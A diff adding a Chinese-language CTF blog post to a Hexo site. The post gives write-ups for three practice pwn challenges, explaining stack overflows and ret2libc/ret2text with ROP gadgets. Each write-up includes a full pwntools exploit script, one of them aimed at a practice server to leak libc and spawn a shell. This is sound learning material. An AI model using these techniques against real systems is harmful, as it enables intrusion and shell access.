@@ -150,6 +150,109 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/12/%E7%AC%AC%E5%9B%9B%E5%91%A8pwn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/02/12/%E7%AC%AC%E5%9B%9B%E5%91%A8pwn/" class="post-title-link" itemprop="url">第四周pwn</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-02-12 09:22:34 / Modified: 13:49:18" itemprop="dateCreated datePublished" datetime="2023-02-12T09:22:34+08:00">2023-02-12</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h2><p><img src="/2023/02/12/%E7%AC%AC%E5%9B%9B%E5%91%A8pwn/Snipaste_2023-02-12_09-24-30.png"></p>
+<p>首先checksec一下，发现打开了NX，接着试着运行一下，给出了三个选项，加密，解密和退出，但是解密的选项却让我们自己来解密。</p>
+<img src="/2023/02/12/%E7%AC%AC%E5%9B%9B%E5%91%A8pwn/Snipaste_2023-02-12_09-21-06.png" style="zoom:50%;">
+
+<p>再来打开ida反编译，推测漏洞可能在加密函数中，果不其然，发现<code>gets</code>函数，<img src="/2023/02/12/%E7%AC%AC%E5%9B%9B%E5%91%A8pwn/Snipaste_2023-02-12_09-27-55.png"></p>
+<p>接下来就是寻找后门<code>system(bin/sh)</code>了，但是查看字符串没有找到，那可能就是<code>ret2libc</code>了。</p>
+<p>分为四步：</p>
+<ol>
+<li>泄露libc版本</li>
+<li>获取system地址和&#x2F;bin&#x2F;sh地址</li>
+<li>再次执行源程序</li>
+<li>触发栈溢出执行system(‘&#x2F;bin&#x2F;sh’)</li>
+</ol>
+<p>这里我们利用<code>puts</code>函数来泄露libc版本</p>
+<p>首先获取<code>pop rdi;ret</code>的地址，顺便也获取了<code>ret</code>的地址</p>
+<p><img src="/2023/02/12/%E7%AC%AC%E5%9B%9B%E5%91%A8pwn/Snipaste_2023-02-12_09-57-24.png"></p>
+<p>同时应注意，加密函数会将payload加密，可以观察代码，解析加密过程，但我选择用<code>\0</code>来绕过<code>strlen</code>函数</p>
+<p>泄露libc地址的<code>payload</code>为</p>
+<p><code>payload = b&quot;\0&quot;+b&quot;a&quot;*0x57+p64(pop_rdi_ret)+p64(puts_got)+p64(pop_plt)+p64(main_addr)</code></p>
+<p>解释一下，<code>puts_got</code>作为参数放到rdi寄存器中，然后<code>pop_rdi_ret</code>将其作为参数提供给<code>puts_plt</code>，将其输出。</p>
+<p>代码为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import * LibcSearcher 崩了(悲)</span></span><br><span class="line">r=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27250</span>)</span><br><span class="line"><span class="comment">#r=process(&quot;./ciscn_2019_c_1&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./ciscn_2019_c_1&quot;</span>)</span><br><span class="line">puts_plt=elf.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">ret=<span class="number">0x4006b9</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x400c83</span></span><br><span class="line">main_addr=<span class="number">0x4009a0</span></span><br><span class="line">payload=<span class="string">b&quot;\0&quot;</span>+<span class="string">b&quot;a&quot;</span>*(<span class="number">0x50</span>+<span class="number">7</span>)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Input your choice!&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Input your Plaintext to be encrypted&quot;</span>,payload)</span><br><span class="line">puts_addr = u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br></pre></td></tr></table></figure>
+
+<p>得到<code>puts</code>的地址<code>0x7f76f052d9c0</code></p>
+<p>寻找合适的libc版本，但是找到了两个，可以一个一个试，但是我选择再加一个限制，<code>__libc_start_main</code></p>
+<p>正如上述<code>payload</code>一样，可以将<code>puts_got</code>换成<code>__libc_start_main_got</code>，而<code>puts_plt</code>保持不变</p>
+<p>最后得到唯一一个libc版本，将其下载，再exp中调用，最后就得到后门。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27250</span>)</span><br><span class="line"><span class="comment">#r=process(&quot;./ciscn_2019_c_1&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./ciscn_2019_c_1&quot;</span>)</span><br><span class="line">puts_plt=elf.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">ret=<span class="number">0x4006b9</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x400c83</span></span><br><span class="line">main_addr=<span class="number">0x4009a0</span></span><br><span class="line">payload=<span class="string">b&quot;\0&quot;</span>+<span class="string">b&quot;a&quot;</span>*(<span class="number">0x50</span>+<span class="number">7</span>)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Input your choice!&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Input your Plaintext to be encrypted&quot;</span>,payload)</span><br><span class="line">puts_addr = u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&quot;./libc6_2.27-3ubuntu1_amd64.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr-libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">sys_addr = libc_base+libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">r.recvuntil(<span class="string">&quot;encrypted&quot;</span>)</span><br><span class="line">payload =<span class="string">b&quot;\0&quot;</span>+<span class="string">b&quot;A&quot;</span>*<span class="number">0x57</span>+p64(ret)+p64(pop_rdi_ret)+p64(bin_addr)+p64(sys_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>虽然但是，有一个挺不懂的事，这个exp在本地跑的时候失败了，但是跑buu上的时候却成功了。</p>
+<p>ps:如何接收puts地址也是一知半解(悲)</p>
+<h2 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h2><p>查看源码，发现是一个简单的ret2text，有<code>backdoor</code>，因为是64位，还要多考虑一下堆栈平衡。</p>
+<p>直接贴exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&quot;./bjdctf_2020_babystack&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./bjdctf_2020_babystack&quot;</span>)</span><br><span class="line">ret = <span class="number">0x400561</span><span class="comment">#保持堆栈平衡</span></span><br><span class="line">backdoor = elf. symbols[<span class="string">&quot;backdoor&quot;</span>]</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x18</span> + p64(ret) + p64(backdoor)</span><br><span class="line">r.sendline(<span class="string">b&quot;999&quot;</span>)<span class="comment">#设置read读取的长度，足够大就行</span></span><br><span class="line">r.recvuntil(<span class="string">b&quot;name?&quot;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>ps:好水啊</p>
+<h2 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h2><p>checksec一下，<img src="/2023/02/12/%E7%AC%AC%E5%9B%9B%E5%91%A8pwn/Snipaste_2023-02-12_13-36-24.png"></p>
+<p>可能是栈溢出(如果不是可能也不会)</p>
+<p>反编译+静态分析<img src="/2023/02/12/%E7%AC%AC%E5%9B%9B%E5%91%A8pwn/Snipaste_2023-02-12_13-37-42.png"></p>
+<p>有栈溢出漏洞，而且有<code>system</code>函数，再查找字符串发现<code>/bin/sh</code></p>
+<p>64位注意堆栈平衡</p>
+<p>需要一个<code>gadgets</code>，我们选择<code>pop rdi;ret</code></p>
+<p>使用<code>ROPgadget --binary babyrop --only &quot;pop|ret&quot;</code>来查找</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&quot;./babyrop&quot;</span>)</span><br><span class="line">system = <span class="number">0x400490</span></span><br><span class="line">binsh = <span class="number">0x601048</span></span><br><span class="line">pop_rdi = <span class="number">0x0400683</span></span><br><span class="line">ret = <span class="number">0x0400479</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x18</span>+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/02/%E7%AC%AC%E4%B8%89%E5%91%A8pwn/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -181,7 +284,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-02-04 16:15:11" itemprop="dateModified" datetime="2023-02-04T16:15:11+08:00">2023-02-04</time>
+                <time title="Modified: 2023-02-12 11:08:10" itemprop="dateModified" datetime="2023-02-12T11:08:10+08:00">2023-02-12</time>
               </span>
 
           
@@ -803,7 +906,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-count">9</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
